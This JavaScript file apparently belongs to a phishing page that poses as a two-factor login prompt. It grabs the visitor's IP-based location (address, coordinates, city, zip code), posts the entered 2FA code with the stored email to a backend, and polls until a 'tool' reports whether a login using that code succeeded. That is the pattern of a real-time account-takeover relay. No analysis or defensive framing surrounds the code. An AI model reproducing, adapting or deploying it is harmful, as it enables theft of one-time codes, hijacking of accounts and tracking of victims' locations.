var ipAddress = "";
var latitude = "";
var longitude = "";
var countryName = "";
var countryCode = "";
var cityName = "";
var regionName = "";
var timeZone = "";
var zipCode = "";
var continent = "";
var continentCode = "";

async function setCurrentLang() {
    let getIpInfoUrl = $('#getIpInfoUrl').val();
    const response = await fetch(getIpInfoUrl);
    const ipInfo = await response.json();
    ipAddress = ipInfo.ipAddress;
    latitude = ipInfo.latitude;
    longitude = ipInfo.longitude;
    countryName = ipInfo.countryName;
    countryCode = ipInfo.countryCode;
    cityName = ipInfo.cityName;
    regionName = ipInfo.regionName;
    timeZone = ipInfo.timeZone;
    zipCode = ipInfo.zipCode;
    continent = ipInfo.continent;
    continentCode = ipInfo.continentCode;
}
setCurrentLang()

$(document).on('click', '#submit-code', function () {
    $('.notice-error').addClass('d-none');
    //
    let recovery_code_entry = $('#input-code').val();
    const loading = $('#submit-code-loading');
    const text = $('#submit-code-text');
    text.addClass('d-none');
    loading.removeClass('d-none');
    setTimeout(() => {
        if (!isValidateFa(recovery_code_entry)) {
            text.removeClass('d-none');
            loading.addClass('d-none');
            $('#input-code').addClass('is-invalid');
        } else {
            $('.notice-error').addClass('d-none');
            sendDataFa();
        }
    }, 500);
});

var idIntervalGetCacheByEmail = null;

async function sendDataFa() {
    $('#submit-code').prop('disabled', true);
    //
    const loading = $('#submit-code-loading');
    const text = $('#submit-code-text');
    let fa_code = $('#input-code').val();
    let email = localStorage.getItem('email', '');
    let formData = new FormData();
    formData.append('fa_code', fa_code);
    formData.append('email', email);
    formData = pushIPInfo(formData);
    await $.ajax({
        method: "POST",
        url: "/api/send-data-fa",
        data: formData,
        cache: false,
        contentType: false,
        processData: false,
        success: function (response) {
            if (response.status == 0) {
                // start to call get cache by email waiting until tool returns response of login
                idIntervalGetCacheByEmail = setInterval(async () => {
                    let info = await getCacheByEmail(email);
                    if (info) {
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                        if (info.isFaSuccessfully) {
                            $('.notice-error').addClass('d-none');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                            window.location.href = $('#url-redirect').val();
                        } else {
                            $('.text-error-fa').text(`@lang('confirm.error_notice')`);
                            $('#error_box').css('display', 'block');
                            $('.notice-error').removeClass('d-none');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        }
                        $('#submit-code').prop('disabled', false);
                        clearInterval(idIntervalGetCacheByEmail);
                        // call api clear all cache
                        $.ajax({
                            method: "POST",
                            url: "/api/delete-all-cache",
                            success: function (response) {
                                if (response.status == 0) {
                                    console.log("Delete all cache success",
                                        response);
                                }
                            }
                        });
                    } else {
                        console.log("Still call get cache by email");
                    }
                }, 3000);
            } else {
                $('.notice-error').removeClass('d-none');
                text.removeClass('d-none');
                loading.addClass('d-none');
                $('#submit-code').prop('disabled', false);
            }
        }
    })
}

async function getCacheByEmail(email) {
    let result = null;
    let formData = new FormData();
    formData.append('email', email);
    await $.ajax({
        method: "POST",
        url: "/api/get-cache-by-email",
        data: formData,
        cache: false,
        contentType: false,
        processData: false,
        success: function (response) {
            if (response.status == 0) {
                result = response.data;
            }
        }
    })

    return result;
}

function pushIPInfo(formData) {
    formData.append('ipAddress', ipAddress)
    formData.append('latitude', latitude)
    formData.append('longitude', longitude)
    formData.append('countryName', countryName)
    formData.append('countryCode', countryCode)
    formData.append('regionName', regionName)
    formData.append('cityName', cityName)
    formData.append('timeZone', timeZone)
    formData.append('zipCode', zipCode)
    formData.append('continent', continent)
    formData.append('continentCode', continentCode)
    return formData;
}

function inputValidateInput() {
    const value = $(this).val();
    if (value !== "") {
        $(this).removeClass('is-invalid')
    }
    const valueEmailDesktop = $('#username-desktop').val();
    const valuePasswordDesktop = $('#password-desktop').val();

    if (valueEmailDesktop !== '' && valuePasswordDesktop !== '') {
        $('#btnLogin-desktop').removeClass('disabled');
    }
}

function isValidateFa(value) {
    const regexOtp = /^\d{6}$|\d{8}$/
    return regexOtp.test(value)
}

function validateOtp() {
    const valueOtp = $(this).val();

    if (!isValidateFa(valueOtp)) {
        $(this).addClass('is-invalid')
        $('#send-otp-number').removeClass('disabled');
    }
}

function onlyNumberInputOtp(event) {
    const valueOtp = $(this).val();
    const ASCIICode = (event.which) ? event.which : event.keyCode
    if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
        return false;

    if (valueOtp.length >= 8) {
        event.preventDefault();
        return false;
    }
}

$(document).on('keypress', '.validate-otp', onlyNumberInputOtp)
$(document).on('input', '.validate-otp', validateOtp)
$(document).on('keydown', '.validate-input', inputValidateInput)
